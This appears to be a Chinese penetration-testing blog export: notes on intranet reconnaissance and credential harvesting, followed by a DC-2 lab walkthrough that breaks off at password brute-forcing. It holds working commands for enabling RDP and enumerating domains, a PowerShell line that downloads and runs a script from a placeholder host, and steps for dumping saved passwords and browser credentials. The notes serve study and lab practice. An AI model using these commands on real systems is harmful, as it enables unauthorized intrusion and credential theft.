class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 在 Windows Server 2003 中开启 3389 端⼝</span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line"># 在 Windows Server 2008 和 Windows Server 2012 中开启 3389 端⼝</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where</span><br><span class="line">(__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br><span class="line"></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where</span><br><span class="line">(TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1</span><br><span class="line"></span><br><span class="line"># 在 Windows 7 中开启 3389 端⼝</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v</span><br><span class="line">fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></li><li><p>查看代理配置情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings</span><br></pre></td></tr></table></figure></li></ul><h2 id="域内信息搜集"><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h2><ul><li><p>获取域SID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure></li><li><p>查询域内用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure></li><li><p>查看域用户的详细信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user tom /domain</span><br></pre></td></tr></table></figure></li><li><p>查询域列表（假如存在多个域）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain</span><br></pre></td></tr></table></figure></li><li><p>查看域内主机信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure></li><li><p>获取所在指定域下的主机名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view /domain:C1ay</span><br></pre></td></tr></table></figure></li><li><p>查看域内计算机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure></li><li><p>查看域信任关系</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure></li><li><p>查询域密码信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure></li><li><p>查看域内时间（时间服务器）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure></li><li><p>查看域内用户组列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">net group /domain</span><br><span class="line"></span><br><span class="line">Domain Admins:域管理员。</span><br><span class="line">Domain Computers: 域内机器。</span><br><span class="line">Domain Controllers:域控制器。</span><br><span class="line">Domain Guest: 域访客，权限较低。</span><br><span class="line">Domain Users: 域用户。</span><br><span class="line">Enterprise Admins: 企业系统管理员用户。</span><br></pre></td></tr></table></figure></li><li><p>查看存在的用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery user</span><br></pre></td></tr></table></figure></li><li><p>通过nltest命令查找域控制器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest /dclist:test</span><br></pre></td></tr></table></figure></li><li><p>通过查询域内时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure></li><li><p>查看域控制器组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; /domain</span><br></pre></td></tr></table></figure></li><li><p>查询主域控制器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdom query pdc</span><br></pre></td></tr></table></figure></li><li><p>nslookup查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup DC1.c1ay.lab</span><br></pre></td></tr></table></figure></li><li><p>查看域管理员组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators /domain</span><br></pre></td></tr></table></figure></li><li><p>获取域管理员列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure></li><li><p>列出进程和进程用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v</span><br></pre></td></tr></table></figure></li><li><p>查询域控制器列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; /domain</span><br></pre></td></tr></table></figure></li><li><p>收集域管理员列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure></li><li><p>收集所有活动域的会话列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NetSess.exe -h DC1</span><br></pre></td></tr></table></figure></li><li><p>交叉引用域管理员列表域活动会话列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; sessions.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I %a</span><br></pre></td></tr></table></figure></li><li><p>从 “Domain Admin” 组中收集域管理员</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure></li></ul><h2 id="内网资源探测"><a href="#内网资源探测" class="headerlink" title="内网资源探测"></a>内网资源探测</h2><h3 id="发现内网存活主机"><a href="#发现内网存活主机" class="headerlink" title="发现内网存活主机"></a>发现内网存活主机</h3><h4 id="1-基于ICMP"><a href="#1-基于ICMP" class="headerlink" title="1.基于ICMP"></a>1.基于ICMP</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.111.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230925221314284.png" alt="image-20230925221314284" style="zoom:80%;"><h4 id="2-基于NetBIOS（网络基本输入-输出系统）协议"><a href="#2-基于NetBIOS（网络基本输入-输出系统）协议" class="headerlink" title="2.基于NetBIOS（网络基本输入&#x2F;输出系统）协议"></a>2.基于NetBIOS（网络基本输入&#x2F;输出系统）协议</h4><p>将<strong>nbtscan.exe</strong>上传到目标主机，执行以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe 192.168.111.1/24</span><br></pre></td></tr></table></figure><h4 id="3-基于UDP"><a href="#3-基于UDP" class="headerlink" title="3.基于UDP"></a>3.基于UDP</h4><p><strong>Unicornscan</strong>是<strong>kali</strong>平台的一款信息收集工具。提供了网络扫描功能。执行以下命令，通过<strong>UDP</strong>协议扫描内网存活主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unicornscan -mU 192.168.111.0/24</span><br></pre></td></tr></table></figure><h4 id="4-基于ARP"><a href="#4-基于ARP" class="headerlink" title="4.基于ARP"></a>4.基于ARP</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br><span class="line">arp-scan.exe -t 192.168.111.0/24</span><br></pre></td></tr></table></figure><p><strong>arp-a</strong>使用的前提是对方主机防火墙的入站规则文件共享开启，并且与其他计算机进行过通信</p><h4 id="5-基于SMB（Server-Message-Block，服务器消息块）协议"><a href="#5-基于SMB（Server-Message-Block，服务器消息块）协议" class="headerlink" title="5.基于SMB（Server Message Block，服务器消息块）协议"></a>5.基于SMB（Server Message Block，服务器消息块）协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 192.168.111.0/24</span><br></pre></td></tr></table></figure><h4 id="6-基于DNS（Domain-Name-System）解析来查找域名对应的IP地址"><a href="#6-基于DNS（Domain-Name-System）解析来查找域名对应的IP地址" class="headerlink" title="6.基于DNS（Domain Name System）解析来查找域名对应的IP地址"></a>6.基于DNS（Domain Name System）解析来查找域名对应的IP地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net net group &quot;domain computers&quot; /domain    查看域内计算机</span><br><span class="line">nslookup 计算机名</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230927155805896.png" class title="image-20230927155805896"><h3 id="内网端口扫描"><a href="#内网端口扫描" class="headerlink" title="内网端口扫描"></a>内网端口扫描</h3><h4 id="1-利用Telnet探测端口"><a href="#1-利用Telnet探测端口" class="headerlink" title="1.利用Telnet探测端口"></a>1.利用Telnet探测端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet &lt;IP&gt; &lt;Port&gt;</span><br></pre></td></tr></table></figure><h4 id="2-利用Nmap进行端口扫描"><a href="#2-利用Nmap进行端口扫描" class="headerlink" title="2.利用Nmap进行端口扫描"></a>2.利用<strong>Nmap</strong>进行端口扫描</h4><p>扫描目标主机全部开放端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sS -p -65535 192.168.111.135</span><br></pre></td></tr></table></figure><p>扫描并获取目标主机制定端口上开放的服务版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -p 80,88,135,139,443,8080,3306,3389 192.168.111.135</span><br></pre></td></tr></table></figure><h4 id="3-利用PowerShell进行端口扫描"><a href="#3-利用PowerShell进行端口扫描" class="headerlink" title="3.利用PowerShell进行端口扫描"></a>3.利用<strong>PowerShell</strong>进行端口扫描</h4><p><strong>NiShang</strong>是基于<strong>PowerShell</strong> 的渗透测试专用框架，集成了各种脚本和<strong>Payload</strong>，广泛用于渗透测试的各阶段。<br><strong>NiShang</strong> 的<strong>Scan</strong>模块中也有一个<strong>Invoke-PortsCan.ps1</strong>脚本，可以用来对主机进行端口扫描（具体见 Github 上的相关网页)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对内网的一个主机范围执行默认的端口扫描</span><br><span class="line">Invoke-PortScan -StartAddress 192.168.111.135 -ResolveHost -ScanPort</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对内网中的一个主机范围扫描制定的端口</span><br><span class="line">powershell.exe -exec bypass -Command &quot;IEX(New-Object Net.WebClient).DownloadString (&#x27;http://your-ip:port/Invoke-portscan.ps1&#x27;);Invoke-PortScan -StartAddress 192.168.111.135 EndAddress -192.168.111.135 -ResolveHst -ScanPort -Port 90,88,135,139,443,8080,3306,3389&quot;</span><br></pre></td></tr></table></figure><h3 id="利用MetaSploit探测内网"><a href="#利用MetaSploit探测内网" class="headerlink" title="利用MetaSploit探测内网"></a>利用MetaSploit探测内网</h3><p>MetaSploit渗透框架中内置了几款资源收集模块，可用于发现内网存活主机、探测内网服务、对目标主机进行端口扫描，如表2-3-1所示。具体利用方法请读者自行查阅相关文档。</p><h3 id="获取端口Banner信息"><a href="#获取端口Banner信息" class="headerlink" title="获取端口Banner信息"></a>获取端口Banner信息</h3><p><strong>Banner</strong>中可能包含一些敏感信息。通过查看端口的<strong>Banner</strong>，测试人员往往可以获取软件开发商、软件名称、服务类型、版本号等信息，根据不同的服务，可以制订不同的攻击方案，而服务的版本号有时会存在公开的漏洞可以被利用。</p><h4 id="1-利用NetCat获取端口Banner"><a href="#1-利用NetCat获取端口Banner" class="headerlink" title="1.利用NetCat获取端口Banner"></a>1.利用NetCat获取端口Banner</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv &lt;IP&gt; &lt;Port&gt;</span><br></pre></td></tr></table></figure><h4 id="2-利用Telnet获取端口Banner"><a href="#2-利用Telnet获取端口Banner" class="headerlink" title="2.利用Telnet获取端口Banner"></a>2.利用Telnet获取端口Banner</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet &lt;IP&gt; &lt;Port&gt;</span><br></pre></td></tr></table></figure><h4 id="3-利用Nmap获取端口Banner"><a href="#3-利用Nmap获取端口Banner" class="headerlink" title="3.利用Nmap获取端口Banner"></a>3.利用Nmap获取端口Banner</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=banner -p &lt;Ports&gt; &lt;IP&gt;</span><br></pre></td></tr></table></figure><h2 id="用户凭据收集"><a href="#用户凭据收集" class="headerlink" title="用户凭据收集"></a>用户凭据收集</h2><p>在内网渗透中，当测试人员获取某台机器的控制权后，会以被攻陷的主机为跳板进行横向渗透，进一步扩大所掌控的资源范围。但是横向渗透中的很多攻击方法都需要先获取到域内用户的密码或哈希值才能进行，如哈希传递攻击、票据传递攻击等。所以在进行信息收集时，要尽可能收集域内用户的登录凭据等信息。</p><h3 id="获取域内单机密码和哈希值"><a href="#获取域内单机密码和哈希值" class="headerlink" title="获取域内单机密码和哈希值"></a>获取域内单机密码和哈希值</h3><p>​        在<strong>Windows</strong>中，<strong>SAM</strong>文件是<strong>Windows</strong>用户的账户数据库，位于系统的<code>%SystemRoot?%System32\Config</code>目录中，所有本地用户的用户名、密码哈希值等信息都存储在这个文件中。用户输入密码登录时，用户输入的明文密码被转换为哈希值，然后与SAM文件中的哈希值对比，若相同，则认证成功。<strong>Isass.exe</strong>是<strong>Windows</strong>的一个系统进程，用于实现系统的安全机制，主要用于本地安全和登录策略。在通常情况下，用户输入密码登录后登录的域名、用户名和登录凭据等信息会存储在<strong>Isass.exe</strong>的进程空间中，用户的明文密码经过<strong>WDigest</strong>和<strong>Tspkg</strong>模块调用后，会对其使用可逆的算法进行加密并存储在内存中。<br>用来获取主机的用户密码和哈希值的工具有很多，这些工具大多是通过读取<strong>SAM</strong>文件或者访问<strong>Isass.exe</strong>进程的内存数据等操作实现的。这些操作大多需要管理员权限，这意味着需要配合一些提权操作，后面的章节会对常见的提权思路进行讲解。<br>下面主要通过<strong>Mimikatz</strong>工具来演示几种获取用户凭据的方法，网络上流行的相关工具还有很多，请读者自行查阅。<br><strong>Mimikatz</strong>是一款功能强大的凭据转储开源程序，可以帮助测试人员提升进程权限、注入进程、读取进程内存等，广泛用于内网渗透测试领域（具体见Github的相关网页）。</p><p>具体见<strong>mimikatz</strong>的使用</p><h3 id="获取常见应用软件凭据"><a href="#获取常见应用软件凭据" class="headerlink" title="获取常见应用软件凭据"></a>获取常见应用软件凭据</h3><p>为了扩大可访问的范围，测试人员通常会搜索各种常见的密码存储位置，以获取用户凭据。一些特定的应用程序可以存储密码，以方便用户管理和维护，如<strong>Xmanager</strong>、<strong>TeamViewer</strong>、<strong>FileZilla</strong>、<strong>NaviCat</strong>和各种浏览器等。通过对保存的用户凭据进行导出和解密，测试人员通常可以获取登录内网服务器和各种管理后台的账号密码，可以通过它们进行横向移动和访问受限资源。</p><h4 id="1-获取RDP保存的凭据"><a href="#1-获取RDP保存的凭据" class="headerlink" title="1.获取RDP保存的凭据"></a>1.获取RDP保存的凭据</h4><p>为了避免每次连接服务器都进行身份验证，经常使用RDP远程桌面连接远程服务器的用户可能勾选保存连接凭据，以便进行快速的身份验证。这些凭据都使用数据保护API以加密形式存储在Windows的凭据管理器中，路径为<code>%USERPROFILE%\AppData\Local\ Microsoft\Credentials</code>。</p><p>执行以下命令，可以查看当前主机上保存的所有连接凭据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmdeky /list                                                查看当前保存的凭据</span><br><span class="line">dir /a %USERPROFILE%\AppData\Local\Microsoft\Credentials\*  遍历Credentials目录下保存的凭据</span><br></pre></td></tr></table></figure><h4 id="2-获取Xshell保存的凭据"><a href="#2-获取Xshell保存的凭据" class="headerlink" title="2.获取Xshell保存的凭据"></a>2.获取Xshell保存的凭据</h4><p>Xshell是一款强大的安全终端模拟软件，支持SSHl、SSH2和Microsoft的TELNET协议。Xshell可以在Windows下访问远端不同系统下的服务器，从而达到远程控制终端的目的。</p><p>将<strong>SharpDecryptPwd</strong>上传到目标主机，执行以下命令，可以直接获取<strong>Xshell</strong>保存的所有连接凭据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpDecryptPwd.exe -Xmangager -p &quot;%USERPROFILE%\Documments\NetSarang Computer\6\Xshell\Sessions&quot;</span><br></pre></td></tr></table></figure><p><strong>Xshell7</strong>后的版本，<strong>Session</strong>目录中不再存储用户密码，用上述方法获取的密码为一串乱码，只能使用星号密码查看器直接查看密码。相关方法这里不再赘述。</p><h4 id="3-获取FileZilla保存的凭据"><a href="#3-获取FileZilla保存的凭据" class="headerlink" title="3.获取FileZilla保存的凭据"></a>3.获取FileZilla保存的凭据</h4><p><strong>FileZilla</strong>是一款快速的、可依赖的、开源的FTP客户端软件，具备大多数FTP软件功能。<strong>FileZilla</strong>会将所有FTP登录凭据以Base64密文的格式保存在<code>%USERPROFILE%AppData\Roaming\FileZilla\recentservers.xml</code>文件中，如图2-4-l4所示。由图2-4-l4可知，<br><code>&lt;User&gt;</code>节点记录了FTP登录用户，<code>&lt;Pass&gt;</code>节点记录了Base64加密后的用户密码，将加密的<strong>FTP</strong>密码解码即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpDecryptPwd.exe -FileZilla</span><br></pre></td></tr></table></figure><p>使用<strong>SharpDecryptPwd</strong>一键导出<strong>FileZilla</strong>保存的<strong>FTP</strong>登录凭据</p><h4 id="4-获取NaviCat保存的凭据"><a href="#4-获取NaviCat保存的凭据" class="headerlink" title="4.获取NaviCat保存的凭据"></a>4.获取NaviCat保存的凭据</h4><p><strong>NaviCat</strong>是一款强大的数据库管理和设计工具，被运维人员广泛使用。当用户连接数据库时，需要填写相关信息，如P、用户名、密码等。用户选择保存密码（默认勾选）后，<strong>Navicat</strong>将把这些信息保存到注册表中。其中，密码是经过可逆算法加密后保存的，并且<strong>Navicat&lt;-&#x3D;11**版本和**Navicat&gt;&#x3D;12</strong>版本分别使用不同的加密算法。</p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230927221412622.png" alt="image-20230927221412622" style="zoom:120%;"><p>通过以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpDecryptPwd.exe -NavicatCrypto</span><br></pre></td></tr></table></figure><p><strong>SharpDecryptPwd</strong>工具可以一键导出当前主机上用户连接过的所有数据库的登录凭据</p><h4 id="5-获取浏览器保存的登录凭据"><a href="#5-获取浏览器保存的登录凭据" class="headerlink" title="5.获取浏览器保存的登录凭据"></a>5.获取浏览器保存的登录凭据</h4><p>Web浏览器通常会保存网站用户名和密码等凭据，以避免多次手动输入。通常，用户的凭据以加密格式存储在本地文件中，测试人员可以通过读取特定的文件，从Wb浏览器中获取凭据。<br><strong>HackBrowserData</strong>是一款开源工具，可以直接从浏览器解密数据包括用户登录密码、书签、Cookie、历史记录、信用卡、下载链接等，支持流行的浏览器，可在<strong>Windows</strong>、 <strong>macOS</strong>和<strong>Linux</strong>平台上运行（具体见Github的相关网页）。<br>只需将<strong>HackBrowserData</strong>上传到目标主机，然后直接运行即可，如图2-4-18所示。<br>执行完毕，会在当前目录下生成一个result目录，包含当前主机中已安装的所有浏览器保存的用户登录密码、浏览器书签、Cookie、历史记录等信息的CSV文件，如图2-4-19所示。</p><h4 id="6-获取WinSCP保留的登录凭据"><a href="#6-获取WinSCP保留的登录凭据" class="headerlink" title="6.获取WinSCP保留的登录凭据"></a>6.获取WinSCP保留的登录凭据</h4><p><strong>WinSCP</strong>是<strong>Windows</strong>环境下使用<strong>SSH</strong>的开源图形化<strong>SFTP</strong>工具客户端。在使用SFTP连接时，如果勾选了“保存密码”，<strong>WinSCP</strong>就会将密码保存在<strong>WinSCP.ini</strong>文件下。<strong>Winscppwd</strong>工具则可以进行解密，</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透体系建设 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DC1 &amp; DC3</title>
      <link href="/2024/01/23/DC2%20&amp;%20DC3/"/>
      <url>/2024/01/23/DC2%20&amp;%20DC3/</url>
      
        <content type="html"><![CDATA[<h2 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h2><img src="/2024/01/23/DC2%20&%20DC3/image-20230717104511424.png" alt="image-20230717104511424" style="zoom: 67%;"><p>搭建好环境后开始</p><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><h4 id="1-探测目标主机IP地址"><a href="#1-探测目标主机IP地址" class="headerlink" title="1. 探测目标主机IP地址"></a>1. 探测目标主机IP地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717110826016.png" alt="image-20230717110826016" style="zoom:50%;"><p>确定目标IP为<code>192.168.85.131</code></p><h4 id="2-全面检测目标IP"><a href="#2-全面检测目标IP" class="headerlink" title="2. 全面检测目标IP"></a>2. 全面检测目标IP</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- 192.168.85.131</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717111058602.png" alt="image-20230717111058602" style="zoom:50%;"><p>可以看到开放了80端口，支持http协议，Apache Debian，还开放了7744端口的ssh服务</p><img src="/2024/01/23/DC2%20&%20DC3/image-20230717111614352.png" alt="image-20230717111614352" style="zoom:40%;"><p>但是访问不成功，这里回过去看刚刚扫出来的信息，发现</p><img src="/2024/01/23/DC2%20&%20DC3/image-20230717111826082.png" alt="image-20230717111826082" style="zoom:50%;"><p>意思是请求的URL并没有遵循重定向到”<a href="http://dc-2/%22%E7%9A%84%E6%8C%87%E7%A4%BA">http://dc-2/&quot;的指示</a></p><p>这个得修改本地DNS文件否则会访问不了 ，打开etc&#x2F;hosts文件，添加一下本地DNS</p><img src="/2024/01/23/DC2%20&%20DC3/image-20230717113054082.png" alt="image-20230717113054082" style="zoom: 50%;"><h4 id="3-网页信息探测"><a href="#3-网页信息探测" class="headerlink" title="3. 网页信息探测"></a>3. 网页信息探测</h4><img src="/2024/01/23/DC2%20&%20DC3/image-20230717112645933.png" alt="image-20230717112645933" style="zoom:40%;"><p>现在就可以进入了，发现网页是WordPress</p><img src="/2024/01/23/DC2%20&%20DC3/image-20230717112833478.png" alt="image-20230717112833478" style="zoom:40%;"><p>点击flag拿到第一个flag，提示我们使用cewl工具生成字典，用用户登录来获取下一个flag</p><h4 id="4-目录扫描"><a href="#4-目录扫描" class="headerlink" title="4.目录扫描"></a>4.目录扫描</h4><p>利用工具<strong>dirsearch</strong>扫描一下网站目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://dc-2/ -e * -x 403 404</span><br><span class="line">-u接网站地址</span><br><span class="line">-e后接语言，可选php，asp，*（表示全部语言）等</span><br><span class="line">-x表示过滤的状态码，扫描出来后不显示该状态</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717114259723.png" alt="image-20230717114259723" style="zoom:50%;"><p>扫出来发现有一个login登录界面</p><p>访问</p><img src="/2024/01/23/DC2%20&%20DC3/image-20230717114548088.png" alt="image-20230717114548088" style="zoom:40%;"><p>进入WordPress的登录界面，接下来我们只要爆破出账号密码即可</p><h3 id="二、-Web端渗透"><a href="#二、-Web端渗透" class="headerlink" title="二、 Web端渗透"></a>二、 Web端渗透</h3><h4 id="1-字典生成"><a href="#1-字典生成" class="headerlink" title="1. 字典生成"></a>1. 字典生成</h4><p>flag1提示了我们，一般的字典可能派不上用场，需要用到cewl工具爬取目标网站信息，生成相对应的字典</p><ul><li>使用方法参考文章<a href="https://www.codercto.com/a/44828.html">kali密码攻击工具——Cewl使用指南</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2/ -w /home/bamboo/桌面/dict.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将爬取http://dc-2/网站生成的字典，放在桌面上的dict.txt文件中</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717120831432.png" alt="image-20230717120831432" style="zoom:50%;"><img src="/2024/01/23/DC2%20&%20DC3/image-20230717120927005.png" alt="image-20230717120927005" style="zoom: 67%;"><p>有了密码字典 还需要找账号和登录框。</p><p>接下来挖挖目录看看，用dirb来挖目录</p><h4 id="2-用户名枚举爆破"><a href="#2-用户名枚举爆破" class="headerlink" title="2. 用户名枚举爆破"></a>2. 用户名枚举爆破</h4><figure class="highlight plaintext"><figcaption><span>http://dc-2</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://dc-2</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/01/23/DC2%20&%20DC3/image-20230717121551958.png" class title="image-20230717121551958"><p>admin.php非常有可能是登录框。我们去访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dc-2/wp-admin/admin.php</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717121653755.png" alt="image-20230717121653755" style="zoom:40%;"><p>网站我们拿到了 还需要账号，这个网站一看就知道是Wordpress，Wordpress有一个著名的扫描工具wpscan</p><p>缺用户名那么我们就</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -e u      //枚举用户名字</span><br></pre></td></tr></table></figure><img src="/2024/01/23/DC2%20&%20DC3/image-20230717121947612.png" alt="image-20230717121947612" style="zoom:50%;"><p>跑出来admin、jerry、tom三个用户名，讲他们写进一个文本文件里面</p><img src="/2024/01/23/DC2%20&%20DC3/image-20230717122239283.png" alt="image-20230717122239283" style="zoom:75%;"><h4 id="3-密码枚举爆破"><a href="#3-密码枚举爆破" class="headerlink" title="3. 密码枚举爆破"></a>3. 